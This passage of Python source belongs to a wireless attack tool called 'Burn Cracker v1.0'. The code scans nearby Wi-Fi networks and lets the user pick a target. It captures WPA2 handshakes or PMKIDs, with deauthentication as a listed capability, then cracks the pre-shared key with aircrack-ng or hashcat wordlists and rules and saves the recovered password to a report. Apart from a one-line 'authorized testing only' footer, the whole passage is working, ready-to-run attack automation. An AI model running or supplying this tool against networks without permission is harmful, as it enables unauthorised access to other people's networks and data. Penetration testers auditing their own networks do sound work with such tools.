    print_status("PMKID captured — hashcat (method 2 or 3) is recommended for PMKID.", "ok")
    return out, False

# ----------------------------------------------------------------
# CHECK GPU / HASHCAT AVAILABILITY
# ----------------------------------------------------------------
def check_hashcat():
    result = run("hashcat --version")
    if result and result.returncode == 0:
        return True
    return False

# ----------------------------------------------------------------
# PREFLIGHT — verify the runtime ENVIRONMENT before doing any work.
# This is deliberately not the unit-test suite: it checks what actually
# fails in the field (missing binaries, no OUI DB), not code logic.
# ----------------------------------------------------------------
REQUIRED_TOOLS = [
    ("airodump-ng", "scanning networks and capturing handshakes"),
    ("aireplay-ng", "deauthentication"),
    ("aircrack-ng", "CPU cracking and handshake verification"),
    ("iw",          "interface enumeration and monitor mode"),
]
OPTIONAL_TOOLS = [
    ("hashcat",       "GPU-accelerated cracking (methods 2 and 3)"),
    ("hcxpcapngtool", "converting captures for hashcat (from hcxtools)"),
    ("hcxdumptool",   "clientless PMKID capture (from hcxdumptool)"),
]

def preflight(verbose=True):
    """Report on required/optional dependencies. Returns True if every
    REQUIRED tool is present. Optional tools and the OUI database only
    downgrade specific features, so they never fail the check."""
    if verbose:
        separator()
        print_status("Preflight — checking dependencies...", "info")

    all_ok = True
    for tool, purpose in REQUIRED_TOOLS:
        if shutil.which(tool):
            if verbose:
                print_status(f"{tool:<15} found   \033[90m({purpose})\033[0m", "ok")
        else:
            all_ok = False
            note("CRACK-104", f"Required tool '{tool}' not found ({purpose}). "
                              f"Install the aircrack-ng suite: sudo apt install aircrack-ng", "err")

    for tool, purpose in OPTIONAL_TOOLS:
        if shutil.which(tool):
            if verbose:
                print_status(f"{tool:<15} found   \033[90m({purpose})\033[0m", "ok")
        elif verbose:
            print_status(f"{tool:<15} \033[90mmissing ({purpose}) — optional\033[0m", "dim")

    oui = next((p for p in OUI_FILES if os.path.exists(p)), None)
    if verbose:
        if oui:
            print_status(f"{'OUI database':<15} found   \033[90m({oui})\033[0m", "ok")
        else:
            print_status(f"{'OUI database':<15} \033[90mmissing (device vendor names) — "
                         f"optional, sudo apt install ieee-data\033[0m", "dim")

    return all_ok

# ----------------------------------------------------------------
# CONVERT .CAP TO HASHCAT FORMAT
# ----------------------------------------------------------------
def convert_to_hccapx(cap_file):
    # Derive output names from the base, not a ".cap" substring — the input
    # may be .cap (airodump handshake) or .pcapng (hcxdumptool PMKID). Mode
    # 22000 covers BOTH the 4-way handshake and the PMKID.
    base = os.path.splitext(cap_file)[0]
    hccapx = base + ".hc22000"
    # Try hcxpcapngtool first (newer, preferred)
    result = run(f"hcxpcapngtool -o {hccapx} {cap_file} 2>/dev/null")
    if result and os.path.exists(hccapx) and os.path.getsize(hccapx) > 0:
        print_status("Converted capture to hashcat format (hc22000).", "ok")
        return hccapx, 22000
    # Fall back to cap2hccapx (older format)
    hccapx2 = base + ".hccapx"
    result = run(f"cap2hccapx {cap_file} {hccapx2} 2>/dev/null")
    if result and os.path.exists(hccapx2) and os.path.getsize(hccapx2) > 0:
        print_status("Converted capture to hashcat format (hccapx).", "ok")
        return hccapx2, 2500
    note("CRACK-303", "Could not convert capture for hashcat. Install hcxtools: sudo apt install hcxtools", "err")
    return None, None

# ----------------------------------------------------------------
# CRACK WITH AIRCRACK (CPU)
# ----------------------------------------------------------------
def crack_aircrack(cap_file, wordlist):
    """Returns (password, completed). completed=False means the crack did
    not finish (timeout/error) — a None password in that case does NOT mean
    the wordlist was exhausted."""
    print_status(f"Cracking with aircrack-ng (CPU)...", "info")
    print_status(f"Wordlist: {os.path.basename(wordlist)}", "dim")
    print_status("Live aircrack-ng output follows — press Ctrl+C to abort.", "dim")
    separator()

    # Stream aircrack-ng's real progress live (keys tested, speed, current
    # passphrase) with an elapsed-time heartbeat during quiet stretches.
    # stdin is closed so aircrack never blocks waiting for a network choice.
    # We capture the output so we can scan it for the KEY FOUND line.
    rc, output = run_streaming(
        ["sudo", "aircrack-ng", cap_file, "-w", wordlist],
        timeout=3600,
        activity="CPU cracking — this can take a while",
        capture=True,
        stdin=subprocess.DEVNULL,
    )

    separator()

    if rc is None:
        note("CRACK-304", "Aircrack-ng cracking timed out after 1 hour — inconclusive, not a security finding.", "err")
        return None, False

    if output and "KEY FOUND" in output:
        for line in output.splitlines():
            if "KEY FOUND" in line:
                key = line.split('[')[1].split(']')[0].strip()
                return key, True
    return None, True

# ----------------------------------------------------------------
# CRACK WITH HASHCAT (GPU)
# ----------------------------------------------------------------
def crack_hashcat(cap_file, wordlist, use_rules=False):
    """Returns (password, completed). completed=False means the crack did
    not finish (conversion/timeout/error) — a None password in that case
    does NOT mean the wordlist was exhausted."""
    print_status("Converting capture for hashcat...", "info")
    hc_file, hc_mode = convert_to_hccapx(cap_file)
    if not hc_file:
        return None, False

    # Build hashcat command
    cmd = ["hashcat", "-m", str(hc_mode), hc_file, wordlist,
           "--force", "--status", "--status-timer=10"]

    if use_rules:
        # Check for common rule files
        rules = [
            "/usr/share/hashcat/rules/best64.rule",
            "/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule",
            "/usr/share/hashcat/rules/dive.rule",
        ]
        rule_file = next((r for r in rules if os.path.exists(r)), None)
        if rule_file:
            cmd += ["-r", rule_file]
            print_status(f"Using rule file: {os.path.basename(rule_file)}", "ok")
        else:
            note("CRACK-502", "No hashcat rule files found — running without rules. Download OneRuleToRuleThemAll: https://github.com/NotSoSecure/password_cracking_rules", "dim")

    print_status("Cracking with hashcat (GPU accelerated)...", "info")
    print_status("This will be significantly faster than CPU cracking.", "dim")
    print_status("Live hashcat output follows — status refreshes every ~10s.", "dim")
    separator()

    # Stream hashcat's output live so the user sees continuous progress
    # instead of a blank screen. We don't parse this stdout for the result —
    # `hashcat --show` is queried below for the definitive cracked password.
    rc, _ = run_streaming(cmd, timeout=3600,
                          activity="GPU busy — this can take a while")

    separator()

    if rc is None:
        note("CRACK-304", "Hashcat process failed to complete (timeout or error) — inconclusive.", "err")
        return None, False

    # Ask hashcat itself whether this hash is cracked, via --show. This reads
    # hashcat's potfile from wherever hashcat actually keeps it, so we don't
    # guess the path (and can't miss a crack that landed in a non-default
    # potfile). --show output is scoped to this exact hash file, unlike the
    # --status stdout (full of colon lines like "Speed.#1....: 1234 H/s" that
    # look like hash:password but aren't).
    pot = run(["hashcat", "-m", str(hc_mode), hc_file, "--show"])
    if pot and pot.stdout.strip():
        # Cracked lines end in ...:password — take the field after the last ':'
        lines = pot.stdout.strip().splitlines()
        if lines:
            password = lines[0].split(":")[-1].strip()
            if password:
                return password, True
    return None, True

# ----------------------------------------------------------------
# CRACK PASSWORD — main entry point, offers CPU or GPU
# ----------------------------------------------------------------
def crack_password(cap_file):
    separator()
    print_status("Select cracking method:", "info")
    print(f"  \033[96m1\033[0m  Aircrack-ng  (CPU — slower, works everywhere)")
    print(f"  \033[96m2\033[0m  Hashcat      (GPU — much faster, requires compatible GPU)")
    print(f"  \033[96m3\033[0m  Hashcat      (GPU + rules — mutates wordlist for better coverage)")
    separator()

    while True:
        try:
            method = int(input("\033[93m[?]\033[0m Choose method (1/2/3): ").strip())
            if method in (1, 2, 3):
                break
            print_status("Enter 1, 2, or 3.", "err")
        except ValueError:
            print_status("Enter a number.", "err")

    # Pick the wordlist now — only once cracking is actually happening. All
    # three methods (aircrack and both hashcat modes) run a dictionary attack,
    # so the wordlist is needed regardless of which was chosen.
    wordlist = check_wordlist()

    password   = None
    completed  = True

    if method == 1:
        password, completed = crack_aircrack(cap_file, wordlist)
    elif method == 2:
        if not check_hashcat():
            note("CRACK-501", "hashcat not found — falling back to aircrack-ng.", "dim")
            password, completed = crack_aircrack(cap_file, wordlist)
        else:
            password, completed = crack_hashcat(cap_file, wordlist, use_rules=False)
    elif method == 3:
        if not check_hashcat():
            note("CRACK-501", "hashcat not found — falling back to aircrack-ng.", "dim")
            password, completed = crack_aircrack(cap_file, wordlist)
        else:
            password, completed = crack_hashcat(cap_file, wordlist, use_rules=True)

    if password:
        print_status(f"PASSWORD CRACKED: \033[96m{password}\033[0m", "ok")
    elif completed:
        note("CRACK-401", "Password not found in wordlist — passphrase resists this wordlist (not a guarantee against a larger wordlist, rules, or a targeted attack).", "err")
        print_status("Try a larger wordlist, different rules, or longer runtime.", "dim")
    else:
        print_status("Cracking did not complete — see the diagnostic above for why. Not a security finding either way.", "dim")

    return password

# ----------------------------------------------------------------
# SAVE RESULTS
# ----------------------------------------------------------------
def save_results(target, password):
    os.makedirs(REPORT_DIR, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    filename = os.path.join(REPORT_DIR, f"burncracker_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 50 + "\n")
        f.write("  BURN CRACKER v1.0 — RESULTS\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"  Scan Time  : {ts}\n")
        f.write(f"  Target SSID: {target['essid']}\n")
        f.write(f"  BSSID      : {target['bssid']}\n")
        f.write(f"  Channel    : {target['channel']}\n")
        f.write(f"  Encryption : {target['enc']}\n\n")
        if password:
            f.write(f"  PASSWORD   : {password}\n\n")
            f.write("  STATUS     : CRACKED\n")
        else:
            f.write("  PASSWORD   : Not found in wordlist\n\n")
            f.write("  STATUS     : NOT CRACKED\n")
        f.write("\n" + "=" * 50 + "\n")
        f.write("  DIAGNOSTICS\n")
        f.write("=" * 50 + "\n")
        if DIAGNOSTICS:
            for d in DIAGNOSTICS:
                f.write(f"  {d}\n")
            f.write("  See ERROR_CODES.txt for what each code means.\n")
        else:
            f.write("  No issues encountered — all checks completed normally.\n")
        f.write("\n" + "=" * 50 + "\n")
        f.write("  For authorized testing only.\n")
        f.write("=" * 50 + "\n")
    return filename

# ----------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------
def main():
    # --check: run the dependency preflight and exit. Doesn't require root,
    # so you can verify a box is ready before an engagement.
    if "--check" in sys.argv:
        ok = preflight()
        separator()
        if ok:
            print_status("All required dependencies present.", "ok")
        else:
            print_status("Missing required dependencies — see CRACK-104 above.", "err")
        sys.exit(0 if ok else 2)

    # Must run as root
    if os.geteuid() != 0:
        note("CRACK-101", "Not running as root. Use: sudo python3 ./burncracker.py", "err")
        sys.exit(2)

    banner()

    # Preflight — bail out early if a required tool is missing, before we
    # bother the user with VM/wordlist/interface prompts.
    if not preflight():
        separator()
        print_status("Cannot continue without the required tools above.", "err")
        sys.exit(2)

    # VM Detection warning
    separator()
    print_status("Checking environment...", "info")
    if check_vm():
        print()
        print(f"  \033[91m{'!'*58}\033[0m")
        print(f"  \033[91m[!] WARNING: Virtual Machine Detected\033[0m")
        print(f"  \033[91m{'!'*58}\033[0m")
        print()
        print_status("Burn Cracker requires direct access to a physical wireless", "dim")
        print_status("card with monitor mode support. Most Type 2 hypervisors", "dim")
        print_status("(VMware, VirtualBox, etc.) do not pass through the host", "dim")
        print_status("wireless card at the kernel level.", "dim")
        print()
        print_status("To use Burn Cracker in a VM you need a USB WiFi adapter", "dim")
        print_status("passed directly through to the VM. Recommended:", "dim")
        print_status("  Alfa AWUS036ACH or AWUS036ACM (plug and play on Kali)", "dim")
        print()
        proceed = input("\033[93m[?]\033[0m Proceed anyway? (yes/no): ").strip().lower()
        if proceed != "yes":
            note("CRACK-103", "VM detected and user declined to continue.", "err")
            sys.exit(1)
        separator()

    # Note: the wordlist is chosen later, at crack time (crack_password),
    # not here — no point picking one before a handshake is even captured.

    # Setup working directory
    os.makedirs(CAPTURE_DIR, exist_ok=True)

    # Select wireless adapter
    global SELECTED_IFACE
    separator()
    iface = select_interface()
    if not iface:
        sys.exit(2)
    SELECTED_IFACE = iface

    # Start monitor mode
    separator()
    if not start_monitor(iface):
        sys.exit(2)

    try:
        # Scan for networks
        separator()
        networks, scan_csv = scan_networks(iface)

        if not networks:
            note("CRACK-202", "No networks found — check your wireless card and try again.", "err")
            sys.exit(3)

        # Display network list with device counts
        print(f"\n\033[92m[+]\033[0m Found {len(networks)} network(s) in range:\n")
        display_networks(networks, scan_csv)

        # Target selection
        while True:
            try:
                choice = int(input(f"\n\033[93m[?]\033[0m Select target # (0-{len(networks)-1}): "))
                if 0 <= choice < len(networks):
                    break
                else:
                    print_status("Invalid selection.", "err")
            except ValueError:
                print_status("Enter a number.", "err")

        target = networks[choice]
        separator()
        print_status(f"Target: \033[96m{target['essid']}\033[0m ({target['bssid']}) — Ch {target['channel']} — {target['enc']}", "ok")

        # Check encryption
        sec = classify_security(target['enc'], target.get('auth', ''))
        if sec == 'open':
            note("CRACK-402", "Target is an open network — no password to crack (not applicable).", "err")
            sys.exit(0)
        if sec == 'enterprise':
            note("CRACK-404", "Target is WPA/WPA2-Enterprise (802.1X/EAP) — there is no pre-shared key to dictionary-attack. This tool targets PSK/SAE-PSK networks.", "err")
            sys.exit(0)
        if sec == 'wpa3-sae':
            note("CRACK-403", "Target is WPA3-only (SAE). SAE is designed to resist OFFLINE dictionary attacks — capturing the handshake does not enable cracking, and no amount of CPU/GPU changes that. Only WPA3 *transition* mode (which also offers WPA2) is attackable, via the WPA2 path.", "err")
            print_status("Nothing to do here — pick a WPA2 or WPA3-transition target instead.", "dim")
            sys.exit(0)
        if sec == 'wpa3-transition':
            print_status("WPA3 transition mode (mixed WPA2/WPA3) — the WPA2 side is attackable.", "info")
            print_status("Targeting a client that connects over WPA2/PSK; WPA3/SAE clients won't yield a crackable handshake.", "dim")

        separator()

        # Capture loop (supports re-targeting). Pick the capture method
        # first; PMKID is clientless, so it skips the station scan entirely.
        while True:
            method = choose_capture_method(iface)

            if method == "pmkid":
                cap_file, reselect = capture_pmkid(target, iface)
            else:
                stations = get_stations(target, iface)
                if stations:
                    print_status(f"Connected devices found: {len(stations)} "
                                 f"({', '.join(mac_vendor(m) for m in stations)})", "ok")
                separator()
                cap_file, reselect = capture_handshake(target, stations, iface)

            if reselect:
                # User wants to pick a different target
                separator()
                display_networks(networks, scan_csv)
                while True:
                    try:
                        choice = int(input(f"\n\033[93m[?]\033[0m Select new target # (0-{len(networks)-1}): "))
                        if 0 <= choice < len(networks):
                            break
                        else:
                            print_status("Invalid selection.", "err")
                    except ValueError:
                        print_status("Enter a number.", "err")
                target = networks[choice]
                separator()
                print_status(f"New target: \033[96m{target['essid']}\033[0m ({target['bssid']})", "ok")
                continue

            if not cap_file:
                # capture_handshake() already logged CRACK-302 with the reason
                sys.exit(3)

            break

        separator()

        # Crack it
        password = crack_password(cap_file)

        separator()

        # Save results
        report = save_results(target, password)
        print_status(f"Results saved to: \033[96m{report}\033[0m", "ok")
    finally:
        # Restore network no matter how we got here — a crash mid-scan
        # should never leave WiFi stuck in monitor mode.
        separator()
        if monitor_active:
            stop_monitor(iface)

    print_status("All done.\n", "ok")

if __name__ == "__main__":
    main()
